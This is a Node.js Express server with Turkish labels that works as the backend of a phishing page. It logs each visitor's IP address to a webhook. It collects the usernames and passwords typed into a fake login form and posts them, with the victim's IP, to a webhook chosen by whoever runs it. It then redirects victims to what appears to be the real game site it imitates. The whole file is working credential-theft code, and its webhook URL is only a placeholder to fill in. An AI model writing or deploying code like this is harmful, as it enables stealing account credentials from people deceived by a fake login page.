// Kötü amaçla kullanmayın (: t.me/fourvz
const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(express.static('public'));

app.get('/', async (req, res) => {
  const webhookUrl = "Webhook Linkiniz";
  const userIP = req.ip;

  const data = {
    content: "New Visitor",
    embeds: [{
      title: "Index Page Visit",
      color: 5814783,
      fields: [
        {
          name: "IP Address",
          value: `\`${userIP}\``,
          inline: true
        },
        {
          name: "Timestamp",
          value: `\`${new Date().toISOString()}\``,
          inline: true
        }
      ],
      footer: {
        text: "Visit Notification"
      }
    }]
  };

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
  } catch (error) {
    console.error('Hata:', error);
  }

  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api', async (req, res) => {
  const webhookUrl = "Webhook Koyun";
  const { username = 'N/A', password = 'N/A', 'csrf-token': csrfToken = 'N/A' } = req.body;
  const userIP = req.ip;

  const data = {
    content: "rafarejma",
    embeds: [{
      title: "Login Details",
      color: 16711680,
      fields: [
        {
          name: "İsim",
          value: `\`${username}\``,
          inline: true
        },
        {
          name: "Şifre",
          value: `\`${password}\``,
          inline: true
        },
        {
          name: "IP Adresi",
          value: `\`${userIP}\``,
          inline: false
        }
      ],
      footer: {
        text: "Ok"
      }
    }]
  };

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });

    if (!response.ok) {
      throw new Error('Failed to send webhook');
    }

    res.redirect('https://craftlime.net');
  } catch (error) {
    res.status(500).json({ status: "error", message: error.message });
  }
});

const PORT = 5000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on port ${PORT}`);
});
